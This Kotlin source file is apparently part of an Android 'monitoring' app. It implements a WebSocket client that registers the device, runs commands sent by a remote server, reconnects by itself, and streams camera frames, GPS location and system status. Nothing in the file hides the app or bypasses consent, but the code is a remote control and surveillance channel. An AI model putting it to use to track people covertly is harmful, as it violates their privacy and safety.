package com.monitoring.service

import android.util.Log
import com.monitoring.collectors.CameraFrame
import com.monitoring.collectors.LocationData
import com.monitoring.collectors.SystemInfo
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class WebSocketClient(
    private val serverUrl: String,
    private val deviceId: String,
    private val deviceName: String,
    private val deviceInfo: Map<String, Any>,
    private val onCommand: (Command) -> Unit
) {
    private var webSocket: WebSocket? = null
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .build()
    
    private var isConnected = false
    private val TAG = "WebSocketClient"
    
    data class Command(
        val type: String,
        val command: String,
        val data: Map<String, Any>
    )
    
    fun connect() {
        val request = Request.Builder()
            .url(serverUrl)
            .build()
        
        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                isConnected = true
                Log.d(TAG, "Connected to server")
                
                // Send registration
                sendRegistration()
            }
            
            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val json = JSONObject(text)
                    val type = json.optString("type")
                    
                    when (type) {
                        "command" -> {
                            val command = json.optString("command")
                            val dataJson = json.optJSONObject("data")
                            val data = dataJson?.let { jsonToMap(it) } ?: emptyMap()
                            
                            onCommand(Command(type, command, data))
                        }
                        "ping" -> {
                            // Respond to ping
                            send("pong", null)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing message: $e")
                }
            }
            
            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                isConnected = false
                Log.d(TAG, "Connection closing: $reason")
            }
            
            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                isConnected = false
                Log.e(TAG, "Connection failed: ${t.message}")
                
                // Try to reconnect after 5 seconds
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    if (!isConnected) {
                        connect()
                    }
                }, 5000)
            }
        })
    }
    
    fun disconnect() {
        webSocket?.close(1000, "Client disconnect")
        isConnected = false
    }
    
    fun sendCameraFrame(frame: CameraFrame) {
        val data = mapOf(
            "camera" to frame.camera,
            "data" to frame.data,
            "width" to frame.width,
            "height" to frame.height,
            "timestamp" to frame.timestamp
        )
        send("camera_frame", data)
    }
    
    fun sendLocation(location: LocationData) {
        val data = mapOf(
            "lat" to location.lat,
            "lon" to location.lon,
            "accuracy" to (location.accuracy ?: 0f),
            "timestamp" to location.timestamp
        )
        send("location_update", data)
    }
    
    fun sendSystemInfo(systemInfo: SystemInfo) {
        val data = mapOf(
            "battery_level" to systemInfo.batteryLevel,
            "is_charging" to systemInfo.isCharging,
            "battery_temp" to systemInfo.batteryTemp,
            "memory_usage" to systemInfo.memoryUsage,
            "storage_usage" to systemInfo.storageUsage,
            "timestamp" to systemInfo.timestamp
        )
        send("system_info", mapOf("data" to data))
    }
    
    private fun sendRegistration() {
        val message = JSONObject().apply {
            put("type", "register")
            put("device_info", JSONObject(deviceInfo))
        }
        
        webSocket?.send(message.toString())
        Log.d(TAG, "Registration sent")
    }
    
    private fun send(type: String, data: Map<String, Any>?) {
        if (!isConnected) {
            Log.w(TAG, "Not connected, cannot send $type")
            return
        }
        
        try {
            val message = JSONObject().apply {
                put("type", type)
                data?.let {
                    for ((key, value) in it) {
                        put(key, value)
                    }
                }
            }
            
            webSocket?.send(message.toString())
        } catch (e: Exception) {
            Log.e(TAG, "Error sending message: $e")
        }
    }
    
    private fun jsonToMap(json: JSONObject): Map<String, Any> {
        val map = mutableMapOf<String, Any>()
        val keys = json.keys()
        while (keys.hasNext()) {
            val key = keys.next()
            map[key] = json.get(key)
        }
        return map
    }
}

